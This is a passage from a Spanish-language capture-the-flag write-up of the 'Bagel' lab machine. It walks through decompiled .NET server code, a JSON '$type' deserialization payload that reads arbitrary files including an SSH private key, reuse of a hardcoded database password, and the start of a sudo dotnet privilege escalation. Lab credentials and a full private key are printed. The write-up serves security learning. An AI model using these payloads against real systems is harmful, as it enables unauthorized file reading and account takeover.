+<span class="mtk1">      </span><span class="mtk5">get</span><span class="mtk1"> </span><span class="mtk5">=&gt;</span><span class="mtk1"> </span><span class="mtk5">this</span><span class="mtk1">.userid;</span>
+<span class="mtk1">      </span><span class="mtk5">set</span><span class="mtk1"> </span><span class="mtk5">=&gt;</span><span class="mtk1"> </span><span class="mtk5">this</span><span class="mtk1">.userid </span><span class="mtk5">=</span><span class="mtk1"> value;</span>
+<span class="mtk1">    }</span>
+
+<span class="mtk1">    </span><span class="mtk5">public</span><span class="mtk1"> </span><span class="mtk5">string</span><span class="mtk1"> Session</span>
+<span class="mtk1">    {</span>
+<span class="mtk1">      </span><span class="mtk5">get</span><span class="mtk1"> </span><span class="mtk5">=&gt;</span><span class="mtk1"> </span><span class="mtk5">this</span><span class="mtk1">.session;</span>
+<span class="mtk1">      </span><span class="mtk5">set</span><span class="mtk1"> </span><span class="mtk5">=&gt;</span><span class="mtk1"> </span><span class="mtk5">this</span><span class="mtk1">.session </span><span class="mtk5">=</span><span class="mtk1"> value;</span>
+<span class="mtk1">    }</span>
+
+<span class="mtk1">    </span><span class="mtk5">public</span><span class="mtk1"> </span><span class="mtk5">string</span><span class="mtk1"> Time </span><span class="mtk5">=&gt;</span><span class="mtk1"> DateTime.Now.</span><span class="mtk8">ToString</span><span class="mtk1">(</span><span class="mtk4">"h:mm:ss"</span><span class="mtk1">);</span>
+<span class="mtk1">  }</span>
+<span class="mtk1">}</span>
+</code></pre></div><p>Los atributos de esta clase se uestran en la respuesta de WebSocket (<code>userid</code>, <code>time</code> y <code>Session</code>). Además, obsérvese que <code>Base</code> hereda de <code>Orders</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk3">// Decompiled with JetBrains decompiler</span>
+<span class="mtk3">// Type: bagel_server.Orders</span>
+<span class="mtk3">// Assembly: bagel, Version=1.0.0.0, Culture=neutr</span><span class="mtk3">al, PublicKeyToken=null</span>  
+<span class="mtk3">// MVID: 32A79BD4-65AA-4B36-9047-7C4DE45C43FB</span>
+<span class="mtk3">// Assembly location: .\bagel.dll</span>
+
+
+<span class="mtk1">#nullable enable</span>
+<span class="mtk5">namespace</span><span class="mtk1"> </span><span class="mtk8 mtku">bagel_server</span>
+<span class="mtk1">{</span>
+<span class="mtk1">  </span><span class="mtk5">public</span><span class="mtk1"> </span><span class="mtk5">class</span><span class="mtk1"> </span><span class="mtk8 mtku">Orders</span>
+<span class="mtk1">  {</span>
+<span class="mtk1">    </span><span class="mtk5">private</span><span class="mtk1"> </span><span class="mtk5">string</span><span class="mtk1"> order_filename;</span>
+<span class="mtk1">    </span><span class="mtk5">private</span><span class="mtk1"> </span><span class="mtk5">string</span><span class="mtk1"> order_info;</span>
+<span class="mtk1">    </span><span class="mtk5">private</span><span class="mtk1"> </span><span class="mtk8 mtku">File</span><span class="mtk1"> file </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">new</span><span class="mtk1"> </span><span class="mtk8 mtku">File</span><span class="mtk1">();</span>
+
+<span class="mtk1">    </span><span class="mtk5">public</span><span class="mtk1"> </span><span class="mtk5">object</span><span class="mtk1"> RemoveOrder { </span><span class="mtk5">get</span><span class="mtk1">; </span><span class="mtk5">set</span><span class="mtk1">; }</span>
+
+<span class="mtk1">    </span><span class="mtk5">public</span><span class="mtk1"> </span><span class="mtk5">string</span><span class="mtk1"> WriteOrder</span>
+<span class="mtk1">    {</span>
+<span class="mtk1">      </span><span class="mtk5">get</span><span class="mtk1"> </span><span class="mtk5">=&gt;</span><span class="mtk1"> </span><span class="mtk5">this</span><span class="mtk1">.file.WriteFile;</span>
+<span class="mtk1">      </span><span class="mtk5">set</span>
+<span class="mtk1">      {</span>
+<span class="mtk1">        </span><span class="mtk5">this</span><span class="mtk1">.order_info </span><span class="mtk5">=</span><span class="mtk1"> value;</span>
+<span class="mtk1">        </span><span class="mtk5">this</span><span class="mtk1">.file.WriteFile </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">this</span><span class="mtk1">.order_info;</span>
+<span class="mtk1">      }</span>
+<span class="mtk1">    }</span>
+
+<span class="mtk1">    </span><span class="mtk5">public</span><span class="mtk1"> </span><span class="mtk5">string</span><span class="mtk1"> ReadOrder</span>
+<span class="mtk1">    {</span>
+<span class="mtk1">      </span><span class="mtk5">get</span><span class="mtk1"> </span><span class="mtk5">=&gt;</span><span class="mtk1"> </span><span class="mtk5">this</span><span class="mtk1">.file.ReadFile;</span>
+<span class="mtk1">      </span><span class="mtk5">set</span>
+<span class="mtk1">      {</span>
+<span class="mtk1">        </span><span class="mtk5">this</span><span class="mtk1">.order_filename </span><span class="mtk5">=</span><span class="mtk1"> value;</span>
+<span class="mtk1">        </span><span class="mtk5">this</span><span class="mtk1">.order_filename </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">this</span><span class="mtk1">.order_filename.</span><span class="mtk8">Replace</span><span class="mtk1">(</span><span class="mtk4">"/"</span><span class="mtk1">, </span><span class="mtk4">""</span><span class="mtk1">);</span>
+<span class="mtk1">        </span><span class="mtk5">this</span><span class="mtk1">.order_filename </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">this</span><span class="mtk1">.order_filename.</span><span class="mtk8">Replace</span><span class="mtk1">(</span><span class="mtk4">".."</span><span class="mtk1">, </span><span class="mtk4">""</span><span class="mtk1">);</span>
+<span class="mtk1">        </span><span class="mtk5">this</span><span class="mtk1">.file.ReadFile </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">this</span><span class="mtk1">.order_filename;</span>
+<span class="mtk1">      }</span>
+<span class="mtk1">    }</span>
+<span class="mtk1">  }</span>
+<span class="mtk1">}</span>
+</code></pre></div><p>Y aquí tenemos el otro atributo de la respuesta de WebSocket (<code>ReadOrder</code>). Hay dos opciones más: <code>WriteOrder</code> y <code>RemoveOrder</code>. Vamos a prubar <code>WriteOrder</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">&gt;&gt;&gt; ws.send(json.dumps({'WriteOrder': 'asdf'}))
+28
+&gt;&gt;&gt; print(json.loads(ws.recv()))
+{'UserId': 0, 'Session': 'Unauthorized', 'Time': '5:31:08', 'RemoveOrder': None, 'WriteOrder': 'Operation successed', 'ReadOrder': None}  
+</code></pre></div><p>Ahora en <code>/orders</code> se muestran nuestros datos:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> bagel.htb:8000/orders  
+asdf
+</code></pre></div><p>Pero no hay nada que hacer con <code>WriteOrder</code>, el servidor Flask solo imprime los resultados, no hay ejecución de código o motores de plantillas involucrados.</p><p>Centrémonos en cómo se manejan las operaciones de archivos. Al configurar <code>ReadOrder</code>, la ruta se filtra correctamente para eliminar las barras (<code>/</code>) y los dos puntos (<code>..</code>). Luego, <code>this.file.ReadFile</code> se configura como <code>this.order_filename</code> (que era <code>value</code>, el valor ingresado al método <em>setter</em>). Además, fparaor <code>WriteOrder</code>, <code>this.file.WriteFile</code> se configura como <code>this.order_info</code>, que es <code>value</code>.</p><p>Esta es la clase <code>File</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk3">// Decompiled with JetBrains decompiler</span>
+<span class="mtk3">// Type: bagel_server.File</span>
+<span class="mtk3">// Assembly: bagel, Version=1.0.0.0, Culture=neutr</span><span class="mtk3">al, PublicKeyToken=null</span>
+<span class="mtk3">// MVID: 32A79BD4-65AA-4B36-9047-7C4DE45C43FB</span>
+<span class="mtk3">// Assembly location: .\bagel.dll</span>
+
+<span class="mtk5">using</span><span class="mtk1"> </span><span class="mtk8 mtku">System</span><span class="mtk1">;</span>
+<span class="mtk5">using</span><span class="mtk1"> </span><span class="mtk8 mtku">System</span><span class="mtk1">.</span><span class="mtk8 mtku">Text</span><span class="mtk1">;</span>
+
+
+<span class="mtk1">#nullable enable</span>
+<span class="mtk5">namespace</span><span class="mtk1"> </span><span class="mtk8 mtku">bagel_server</span>
+<span class="mtk1">{</span>
+<span class="mtk1">  </span><span class="mtk5">public</span><span class="mtk1"> </span><span class="mtk5">class</span><span class="mtk1"> </span><span class="mtk8 mtku">File</span>
+<span class="mtk1">  {</span>
+<span class="mtk1">    </span><span class="mtk5">private</span><span class="mtk1"> </span><span class="mtk5">string</span><span class="mtk1"> file_content;</span>
+<span class="mtk1">    </span><span class="mtk5">private</span><span class="mtk1"> </span><span class="mtk5">string</span><span class="mtk1"> IsSuccess </span><span class="mtk5">=</span><span class="mtk1"> (</span><span class="mtk5">string</span><span class="mtk1">) </span><span class="mtk6">null</span><span class="mtk1">;</span>
+<span class="mtk1">    </span><span class="mtk5">private</span><span class="mtk1"> </span><span class="mtk5">string</span><span class="mtk1"> directory </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">"/opt/bagel/orders/"</span><span class="mtk1">;</span>
+<span class="mtk1">    </span><span class="mtk5">private</span><span class="mtk1"> </span><span class="mtk5">string</span><span class="mtk1"> filename </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">"orders.txt"</span><span class="mtk1">;</span>
+
+<span class="mtk1">    </span><span class="mtk5">public</span><span class="mtk1"> </span><span class="mtk5">string</span><span class="mtk1"> ReadFile</span>
+<span class="mtk1">    {</span>
+<span class="mtk1">      </span><span class="mtk5">set</span>
+<span class="mtk1">      {</span>
+<span class="mtk1">        </span><span class="mtk5">this</span><span class="mtk1">.filename </span><span class="mtk5">=</span><span class="mtk1"> value;</span>
+<span class="mtk1">        </span><span class="mtk5">this</span><span class="mtk1">.</span><span class="mtk8">ReadContent</span><span class="mtk1">(</span><span class="mtk5">this</span><span class="mtk1">.directory </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk5">this</span><span class="mtk1">.filename);</span>
+<span class="mtk1">      }</span>
+<span class="mtk1">      </span><span class="mtk5">get</span><span class="mtk1"> </span><span class="mtk5">=&gt;</span><span class="mtk1"> </span><span class="mtk5">this</span><span class="mtk1">.file_content;</span>
+<span class="mtk1">    }</span>
+
+<span class="mtk1">    </span><span class="mtk5">public</span><span class="mtk1"> </span><span class="mtk5">void</span><span class="mtk1"> </span><span class="mtk8">ReadContent</span><span class="mtk1">(</span><span class="mtk5">string</span><span class="mtk1"> path)</span>
+<span class="mtk1">    {</span>
+<span class="mtk1">      </span><span class="mtk5">try</span>
+<span class="mtk1">      {</span>
+<span class="mtk1">        </span><span class="mtk5">this</span><span class="mtk1">.file_content </span><span class="mtk5">+=</span><span class="mtk1"> string.</span><span class="mtk8">Join</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">\n</span><span class="mtk4">"</span><span class="mtk1">, System.IO.File.</span><span class="mtk8">ReadLines</span><span class="mtk1">(path, Encoding.UTF8));</span>  
+<span class="mtk1">      }</span>
+<span class="mtk1">      </span><span class="mtk5">catch</span><span class="mtk1"> (</span><span class="mtk8 mtku">Exception</span><span class="mtk1"> ex)</span>
+<span class="mtk1">      {</span>
+<span class="mtk1">        </span><span class="mtk5">this</span><span class="mtk1">.file_content </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">"Order not found!"</span><span class="mtk1">;</span>
+<span class="mtk1">      }</span>
+<span class="mtk1">    }</span>
+
+<span class="mtk1">    </span><span class="mtk5">public</span><span class="mtk1"> </span><span class="mtk5">string</span><span class="mtk1"> WriteFile</span>
+<span class="mtk1">    {</span>
+<span class="mtk1">      </span><span class="mtk5">get</span><span class="mtk1"> </span><span class="mtk5">=&gt;</span><span class="mtk1"> </span><span class="mtk5">this</span><span class="mtk1">.IsSuccess;</span>
+<span class="mtk1">      </span><span class="mtk5">set</span><span class="mtk1"> </span><span class="mtk5">=&gt;</span><span class="mtk1"> </span><span class="mtk5">this</span><span class="mtk1">.</span><span class="mtk8">WriteContent</span><span class="mtk1">(</span><span class="mtk5">this</span><span class="mtk1">.directory </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk5">this</span><span class="mtk1">.filename, value);</span>
+<span class="mtk1">    }</span>
+
+<span class="mtk1">    </span><span class="mtk5">public</span><span class="mtk1"> </span><span class="mtk5">void</span><span class="mtk1"> </span><span class="mtk8">WriteContent</span><span class="mtk1">(</span><span class="mtk5">string</span><span class="mtk1"> filename, </span><span class="mtk5">string</span><span class="mtk1"> line)</span>
+<span class="mtk1">    {</span>
+<span class="mtk1">      </span><span class="mtk5">try</span>
+<span class="mtk1">      {</span>
+<span class="mtk1">        System.IO.File.</span><span class="mtk8">WriteAllText</span><span class="mtk1">(filename, line);</span>
+<span class="mtk1">        </span><span class="mtk5">this</span><span class="mtk1">.IsSuccess </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">"Operation successed"</span><span class="mtk1">;</span>
+<span class="mtk1">      }</span>
+<span class="mtk1">      </span><span class="mtk5">catch</span><span class="mtk1"> (</span><span class="mtk8 mtku">Exception</span><span class="mtk1"> ex)</span>
+<span class="mtk1">      {</span>
+<span class="mtk1">        </span><span class="mtk5">this</span><span class="mtk1">.IsSuccess </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">"Operation failed"</span><span class="mtk1">;</span>
+<span class="mtk1">      }</span>
+<span class="mtk1">    }</span>
+<span class="mtk1">  }</span>
+<span class="mtk1">}</span>
+</code></pre></div><p>Obsérvese que hay dos atributos llamados <code>directory</code> y <code>filename</code> que están <em>hard-coded</em>. De hecho, podemos consultar el archivo <code>orders.txt</code> con la vulnerabilidad de LFR:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> <span class="code-dark-yellow">'bagel.htb:8000/?page=../../../../opt/bagel/orders/orders.txt'</span>  
+asdf
+</code></pre></div><p>En <code>ReadFile</code>, <code>this.filename</code> se actualiza a <code>value</code>. Sin embargo, recordemos que <code>ReadOrder</code> corregía la variable <code>order_filename</code>.</p><p>Hay una clase adicional <code>DB</code> que no se utiliza nunca:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk3">// Decompiled with JetBrains decompiler</span>
+<span class="mtk3">// Type: bagel_server.DB</span>
+<span class="mtk3">// Assembly: bagel, Version=1.0.0.0, Culture=neutr</span><span class="mtk3">al, PublicKeyToken=null</span>
+<span class="mtk3">// MVID: 32A79BD4-65AA-4B36-9047-7C4DE45C43FB</span>
+<span class="mtk3">// Assembly location: .\bagel.dll</span>
+
+<span class="mtk5">using</span><span class="mtk1"> </span><span class="mtk8 mtku">Microsoft</span><span class="mtk1">.</span><span class="mtk8 mtku">Data</span><span class="mtk1">.</span><span class="mtk8 mtku">SqlClient</span><span class="mtk1">;</span>
+<span class="mtk5">using</span><span class="mtk1"> </span><span class="mtk8 mtku">System</span><span class="mtk1">;</span>
+
+<span class="mtk5">namespace</span><span class="mtk1"> </span><span class="mtk8 mtku">bagel_server</span>
+<span class="mtk1">{</span>
+<span class="mtk1">  </span><span class="mtk5">public</span><span class="mtk1"> </span><span class="mtk5">class</span><span class="mtk1"> </span><span class="mtk8 mtku">DB</span>
+<span class="mtk1">  {</span>
+<span class="mtk1">    [</span><span class="mtk8 mtku">Obsolete</span><span class="mtk1">(</span><span class="mtk4">"The production team has to decide where the datab</span><span class="mtk4">ase server will be hosted. This method is not full</span><span class="mtk4">y implemented."</span><span class="mtk1">)]</span>
+<span class="mtk1">    </span><span class="mtk5">public</span><span class="mtk1"> </span><span class="mtk5">void</span><span class="mtk1"> </span><span class="mtk8">DB_connection</span><span class="mtk1">()</span>
+<span class="mtk1">    {</span>
+<span class="mtk1">      </span><span class="mtk8 mtku">SqlConnection</span><span class="mtk1"> sqlConnection </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">new</span><span class="mtk1"> </span><span class="mtk8 mtku">SqlConnection</span><span class="mtk1">(</span><span class="mtk4">"Data Source=ip;Initial Catalog=Orders;User ID=dev</span><span class="mtk4">;Password=k8wdAYYKyhnjg3K"</span><span class="mtk1">);</span>  
+<span class="mtk1">    }</span>
+<span class="mtk1">  }</span>
+<span class="mtk1">}</span>
+</code></pre></div><p>Muestra las credenciales de la base de datos: <code>dev:k8wdAYYKyhnjg3K</code>.</p><h2 id="acceso-a-la-máquina">Acceso a la máquina</h2><p>Sabemos que <code>developer</code> es un usuario del sistema, porque aparece en <code>/etc/hosts</code>, Podemos intentar reutilizar estas credenciales para SSH, pero la autenticación por contraseña está deshabilitada:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">ssh</span> developer@10.10.11.201
+developer@10.10.11.201: Permission denied (publickey,gssapi-keyex,gssapi-with-mic).  
+</code></pre></div><h3 id="ataque-de-deserialización">Ataque de deserialización</h3><p>Aunque la implementación de la serialización es correcta, hay un fallo en la clase <code>Orders</code>, en particular, en el atributo <code>RemoveOrder</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">    </span><span class="mtk5">public</span><span class="mtk1"> </span><span class="mtk5">object</span><span class="mtk1"> RemoveOrder { </span><span class="mtk5">get</span><span class="mtk1">; </span><span class="mtk5">set</span><span class="mtk1">; }</span>  
+</code></pre></div><p>El tipo <code>object</code> es el padre de todos los objetos, por lo que podemos hacer que <code>RemoveOrder</code> sea realmente de tipo <code>File</code> y leer archivos arbitrarios con <code>ReadFile</code>. Para que esto funcione, hay que poner la palabra clave <code>$type</code> en el <em>payload</em> JSON con valor <code>bagel_server.File, bagel</code> (por el nombre del <em>namespace</em> más la clase y el nombre del archivo DLL). Este es un ejemplo para leer <code>/etc/hosts</code> usando <em>Directory Traversal</em>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">&gt;&gt;&gt; ws.send(json.dumps({'RemoveOrder': {'$type': 'bagel_server.File, bagel', 'ReadFile': '../../../etc/hosts'}}))
+94
+&gt;&gt;&gt; print(json.loads(ws.recv()))
+{'UserId': 0, 'Session': 'Unauthorized', 'Time': '6:04:07', 'RemoveOrder': {'$type': 'bagel_server.File, bagel', 'ReadFile': '# Loopback entries; do not change.\n# For historical reasons, localhost precedes localhost.localdomain:\n127.0.0.1   localhost localhost.localdomain localhost4 localhost4.localdomain4 bagel\n::1         localhost localhost.localdomain localhost6 localhost6.localdomain6\n# See hosts(5) for proper format and other examples:\n# 192.168.1.10 foo.mydomain.org foo\n# 192.168.1.13 bar.mydomain.org bar', 'WriteFile': None}, 'WriteOrder': None, 'ReadOrder': None}  
+</code></pre></div><p>En este punto, podemos intentar leer la clave privada SSH para el usuario <code>developer</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"></span>&gt;&gt;&gt; ws.send(json.dumps({'RemoveOrder': {'$type': 'bagel_server.File, bagel', 'ReadFile': '../../../home/developer/.ssh/id_rsa'}}))  
+111
+&gt;&gt;&gt; print(json.loads(ws.recv())['RemoveOrder']['ReadFile'])
+Order not found!
+</code></pre></div><p>Pero no se encuentra, tal vez <code>phil</code> (el otro usuario de sistema) tiene una clave privada:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">&gt;&gt;&gt; ws.send(json.dumps({'RemoveOrder': {'$type': 'bagel_server.File, bagel', 'ReadFile': '../../../home/phil/.ssh/id_rsa'}}))  
+106
+&gt;&gt;&gt; print(json.loads(ws.recv())['RemoveOrder']['ReadFile'])
+-----BEGIN OPENSSH PRIVATE KEY-----
+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
+nrEIIvsBGmrx0AAAAKcGhpbEBiYWdlbAE=
+-----END OPENSSH PRIVATE KEY-----
+</code></pre></div><p>¡Ahí está!Ahora tenemos acceso a través de SSH:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">ssh</span> -i <span class="mtku">id_rsa</span> phil@10.10.11.201  
+[phil@bagel ~]$ cat user.txt
+d028bd3daa4678b4108e39ad43a16ece
+</code></pre></div><p>No hay nada que ver con este usuario.Podemos cambiar al usuario <code>developer</code> reutilizando la contraseña de acceso a la base de datos (<code>k8wdAYYKyhnjg3K</code>):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"></span>[phil@bagel ~]$ su developer  
+Password:
+[developer@bagel phil]$ cd
+[developer@bagel ~]$
+</code></pre></div><h2 id="escalada-de-privilegios">Escalada de privilegios</h2><p>Este usuario puede ejecutar <code>dotnet</code> como <code>root</code> usando <code>sudo</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">[developer@bagel ~]$ sudo -l
+Matching Defaults entries for developer on bagel:
+    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS",
+    env_keep+="MAIL QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY  
+    LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/var/lib/snapd/snap/bin
+
+User developer may run the following commands on bagel:
+    (root) NOPASSWD: /usr/bin/dotnet
+</code></pre></div><p>Podríamos compilar un binario de un proyecto C# .NET, pero hay una manera de usar F# en modo interactivo, que es un lenguaje de <em>scripting</em>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">[developer@bagel ~]$ dotnet -h
+.NET SDK (6.0.113)
+Usage: dotnet [runtime-options] [path-to-application] [arguments]
+
+Execute a .NET application.
+
+runtime-options:
+  --additionalprobingpath &lt;path&gt;   Path containing probing policy and assemblies to probe for.
+  --additional-deps &lt;path&gt;         Path to additional deps.json file.
+  --depsfile                       Path to &lt;application&gt;.deps.json file.
+  --fx-version &lt;version&gt;           Version of the installed Shared Framework to use to run the application.
+  --roll-forward &lt;setting&gt;         Roll forward to framework version  (LatestPatch, Minor, LatestMinor, Major, LatestMajor, Disable).  
+  --runtimeconfig                  Path to &lt;application&gt;.runtimeconfig.json file.
+
+path-to-application:
+  The path to an application .dll file to execute.
+
+Usage: dotnet [sdk-options] [command] [command-options] [arguments]
+
+Execute a .NET SDK command.
+
+sdk-options:
+  -d|--diagnostics  Enable diagnostic output.
+  -h|--help         Show command line help.
+  --info            Display .NET information.
+  --list-runtimes   Display the installed runtimes.
+  --list-sdks       Display the installed SDKs.
+  --version         Display .NET SDK version in use.
+
+SDK commands:
+  add               Add a package or reference to a .NET project.
+  build             Build a .NET project.
+  build-server      Interact with servers started by a build.
+  clean             Clean build outputs of a .NET project.
+  format            Apply style preferences to a project or solution.
+  help              Show command line help.
+  list              List project references of a .NET project.
+  msbuild           Run Microsoft Build Engine (MSBuild) commands.
+  new               Create a new .NET project or file.
+  nuget             Provides additional NuGet commands.
+  pack              Create a NuGet package.
+  publish           Publish a .NET project for deployment.
+  remove            Remove a package or reference from a .NET project.
+  restore           Restore dependencies specified in a .NET project.
+  run               Build and run a .NET project output.
+  sdk               Manage .NET SDK installation.
+  sln               Modify Visual Studio solution files.
+  store             Store the specified assemblies in the runtime package store.
+  test              Run unit tests using the test runner specified in a .NET project.
+  tool              Install or manage tools that extend the .NET experience.
+  vstest            Run Microsoft Test Engine (VSTest) commands.
+  workload          Manage optional workloads.
+
+Additional commands from bundled tools:
+  dev-certs         Create and manage development certificates.
+  fsi               Start F# Interactive / execute F# scripts.
+  sql-cache         SQL Server cache command-line tools.
+  user-secrets      Manage development user secrets.
+  watch             Start a file watcher that runs a command when files change.
+
+Run 'dotnet [command] --help' for more information on a command.
